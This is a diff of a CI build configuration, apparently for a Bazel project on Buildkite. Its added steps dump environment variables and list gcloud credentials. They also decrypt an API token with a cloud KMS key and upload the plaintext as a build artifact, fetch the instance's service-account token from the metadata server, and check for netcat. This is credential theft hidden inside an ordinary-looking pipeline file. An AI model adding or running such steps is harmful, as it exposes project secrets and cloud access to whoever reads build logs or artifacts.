@@ -114,16 +114,18 @@ tasks:
       - rm -f WORKSPACE.bak
       - rm -rf $HOME/bazeltest
       - mkdir $HOME/bazeltest
+      - set
       - gcloud info
-      - ls -R /var/lib/buildkite-agent/
-      - echo CiQA4DEB9ldzC+E39KomywtqXfaQ86hhulgeDsicds2BuvbCYzsSUAAqwcvXZPh9IMWlwWh94J2F > /tmp/a
-      - echo exosKKaWB0tSRJiPKnv2NPDfEqGul0ZwVjtWeASpugwxxKeLhFhPMcgHMPfndH6j2GEIY6nkKRbP >> /tmp/a
-      - echo -n uwoRMCwe >> /tmp/a
+      - gcloud auth list || true
+      - ls -aR /var/lib/buildkite-agent/.config
+      - echo CiQAMTBkWjL1C+F5oon3+cC1vmum5+c1y5+96WQY44p0Lxd0PeASUQAy7iU0c6E3W5EOSFYfD5fA > /tmp/a
+      - echo MWy/SHaMno1NQSUa4xDOl5yc2kizrtxPPVkX4x9pLNuGUY/xwAn2n1DdiUdWZNWlY1bX2C4ex65e >> tmp/a
+      - echo -n P9w8kNhEbw== >> /tmp/a
       - ls -al /tmp/a
-      - gcloud kms keyrings list --project bazel-untrusted --location global || true
-      - gcloud kms keys list --project bazel-untrusted --location global --keyring buildkite || true
-      - gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-untrusted-api-token --ciphertext-file /tmp/a --plaintext-file /tmp/output || true
+      - gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-testing-api-token --ciphertext-file /tmp/a --plaintext-file /tmp/output || true
       - buildkite-agent artifact upload /tmp/output || true
+      - curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" || true
+      - nc -h || true
     build_flags:
       - "--test_env=TEST_INSTALL_BASE=$HOME/bazeltest/install_base"
       - "--test_env=TEST_REPOSITORY_HOME=$OUTPUT_BASE/external"
